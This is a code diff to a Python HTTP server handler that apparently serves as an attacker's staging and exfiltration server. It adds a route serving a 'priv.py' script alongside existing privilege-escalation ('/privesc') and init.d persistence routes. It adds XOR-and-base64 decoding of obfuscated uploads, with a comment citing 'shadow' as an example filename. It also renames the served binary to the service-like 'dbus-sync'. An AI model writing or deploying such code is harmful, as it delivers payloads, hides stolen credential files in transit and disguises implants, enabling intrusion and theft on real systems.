@@ -73,6 +73,8 @@ class _Handler(BaseHTTPRequestHandler):
             self._serve_binary()
         elif self.path == "/privesc":
             self._serve_file("privesc", "application/octet-stream")
+        elif self.path == "/priv":
+            self._serve_file("priv.py", "text/plain")
         elif self.path == "/initd":
             self._serve_file("initd", "text/plain")
         else:
@@ -98,6 +100,10 @@ class _Handler(BaseHTTPRequestHandler):
         try:
             length = int(self.headers.get("Content-Length", 0))
             data = self.rfile.read(length)
+            if self.headers.get("X-Enc") == "rxb64":
+                import base64
+                xored = base64.b64decode(data)
+                data = bytes(b ^ ((0xAB + i) & 0xFF) for i, b in enumerate(xored))
             # filename from query string e.g. /u?filename=shadow
             filename = "upload"
             if "?" in self.path:
@@ -130,7 +136,7 @@ class _Handler(BaseHTTPRequestHandler):
             self._respond(500, "text/plain", b"error")
 
     def _serve_binary(self):
-        path = os.path.join(STAGING_DIR, "dbus-daemon")
+        path = os.path.join(STAGING_DIR, "dbus-sync")
         try:
             with open(path, "rb") as fh:
                 content = fh.read()
